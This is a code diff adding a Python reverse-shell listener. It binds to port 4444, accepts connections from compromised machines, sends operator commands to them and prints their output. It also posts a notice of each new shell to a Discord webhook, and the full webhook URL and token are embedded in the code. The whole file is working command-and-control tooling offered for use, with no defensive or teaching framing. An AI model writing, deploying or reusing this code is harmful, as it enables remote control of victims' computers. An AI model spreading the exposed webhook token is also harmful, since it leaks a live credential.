@@ -1,0 +1,38 @@
+import socket
+import threading
+import requests
+
+WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1383916610019918029/pf_qhfokCz4r-DO1tFjAPXBWpstlC5Q8y3NgvwR9I4v30ixn2acQFOG7oW45pSfqWrdO'  # Replace with your webhook
+
+def handle_client(client_socket, address):
+    print(f"[+] Connection from {address}")
+    requests.post(WEBHOOK_URL, json={"content": f"🟢 Reverse shell connected from {address}"})
+
+    while True:
+        try:
+            command = input(f"Shell@{address}> ")
+            if command.lower() == 'exit':
+                client_socket.send(b'exit')
+                client_socket.close()
+                break
+
+            client_socket.send(command.encode())
+            response = client_socket.recv(4096).decode()
+            print(response)
+
+        except Exception as e:
+            print(f"[-] Connection lost: {e}")
+            break
+
+def start_listener(ip='0.0.0.0', port=4444):
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind((ip, port))
+    server.listen(5)
+    print(f"[*] Listening on {ip}:{port}")
+
+    while True:
+        client, addr = server.accept()
+        thread = threading.Thread(target=handle_client, args=(client, addr))
+        thread.start()
+
+start_listener()
